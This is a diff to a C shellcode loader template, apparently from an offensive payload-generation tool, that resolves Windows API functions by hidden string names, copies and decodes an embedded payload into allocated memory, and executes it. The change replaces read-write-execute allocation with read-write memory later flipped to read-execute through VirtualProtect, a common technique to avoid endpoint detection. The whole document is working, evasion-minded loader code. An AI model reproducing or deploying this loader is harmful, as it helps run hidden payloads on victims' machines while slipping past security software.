@@ -84,13 +84,30 @@ int main()
 			_In_ DWORD  flAllocationType,
 			_In_ DWORD  flProtect)) _GetProcAddress((HMODULE)base, VirtualAlloc_str);
 	if (_VirtualAlloc == NULL) return 4;
-	char *dest = _VirtualAlloc(NULL, {{PAYLOAD_LEN}}, 0x3000, 0x40);
+	char *dest = _VirtualAlloc(NULL, {{PAYLOAD_LEN}}, 0x3000, 0x04); // rw
+
+	//sleep_ms(10000);
 
 	// Copy
 	// from: supermega_payload[]
 	// to:   dest[]
     // len:  0x11223344
 {{ plugin_decoder }}
+
+
+	// ntdll.dll: VirtualAlloc()
+	char VirtualProtect_str[] = { 'V','i','r','t','u','a','l','P','r','o','t','e', 'c', 't', 0 };
+	LPVOID (WINAPI * _VirtualProtect)(
+		_In_ LPVOID lpAddress,
+		_In_ SIZE_T dwSize,
+		_In_ DWORD  flNewProtect,
+		_Out_ PDWORD lpflOldProtect) = (LPVOID (WINAPI*)(
+			_In_ LPVOID lpAddress,
+			_In_ SIZE_T dwSize,
+			_In_ DWORD  flNewProtect,
+			_Out_ PDWORD lpflOldProtect)) _GetProcAddress((HMODULE)base, VirtualProtect_str);
+	if (_VirtualProtect == NULL) return 4;
+	_VirtualProtect(dest, {{PAYLOAD_LEN}}, 0x20, &result); // rx
 
     // Execute *dest
     (*(void(*)())(dest))();
